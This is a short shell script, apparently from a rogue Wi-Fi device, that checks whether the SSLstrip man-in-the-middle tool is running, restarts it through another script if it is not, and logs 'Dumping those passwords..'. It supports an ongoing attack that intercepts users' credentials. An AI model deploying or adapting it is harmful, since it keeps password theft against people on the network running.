!/bin/sh
# -----------------------------------------------------------------
# Simple script to check if SSLstrip is running and restart if not
# -----------------------------------------------------------------
# We could used 'pidof python' but we might be running other python scripts in the future.
logger "SSLstrip: Keep-Alive Script Executed"
if ! ( pidof python /usb/usr/bin/sslstrip); then
	/home/wpsScript.sh &
	logger "SSLstrip seemed to be down. Issued /home/wpsScript.sh"
else
	logger "SSLstrip seems to be up. Dumping those passwords.."
fi
